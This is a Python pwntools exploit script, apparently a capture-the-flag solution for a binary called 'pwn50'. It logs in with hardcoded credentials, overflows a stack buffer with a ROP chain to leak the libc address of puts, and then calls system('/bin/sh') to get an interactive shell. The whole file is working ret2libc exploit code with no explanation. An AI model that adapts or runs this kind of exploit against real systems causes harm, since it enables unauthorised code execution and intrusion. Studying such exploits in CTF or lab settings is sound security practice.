from pwn import *

# context.log_level =  'debug'

p = process('./pwn50')
elf = ELF('./pwn50')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x0000000000400b03
menu_addr = 0x00000000004008BF
read_plt = elf.plt['read']
read_got = elf.got['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pad = '3'*0x50

p.recvuntil('username: ')
p.sendline('admin')
p.recvuntil('password: ')
p.sendline('T6OBSh2i')

p.recvuntil('Your choice: ')

payload1 = pad
payload1 += p64(0)
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(menu_addr)

p.sendline(payload1)

data = u64(p.recv(6).ljust(8,'\x00'))
print 'raed_addr:'+hex(data)

libc_base = data - libc.symbols['puts']
read_addr = libc_base + libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + 0x18cd57

p.recvuntil('Your choice: ')

payload2 = pad
payload2 += p64(0)
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)
payload2 += p64(menu_addr)

p.sendline(payload2)
p.interactive()